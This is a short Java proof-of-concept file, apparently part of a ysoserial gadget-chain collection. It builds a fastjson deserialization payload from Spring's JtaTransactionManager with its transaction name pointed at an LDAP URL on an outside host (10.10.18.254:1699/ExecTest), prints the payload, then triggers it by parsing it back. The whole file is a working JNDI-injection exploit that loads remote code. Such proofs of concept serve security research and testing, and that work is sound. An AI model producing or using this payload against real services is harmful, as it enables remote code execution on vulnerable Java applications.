package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;
import org.springframework.transaction.jta.JtaTransactionManager;

public class Poc2 {
    public static void main(String[] args) {
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName("ldap://10.10.18.254:1699/ExecTest");


        String poc = JSON.toJSONString(jtaTransactionManager, SerializerFeature.WriteClassName);

        System.out.println(poc);
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
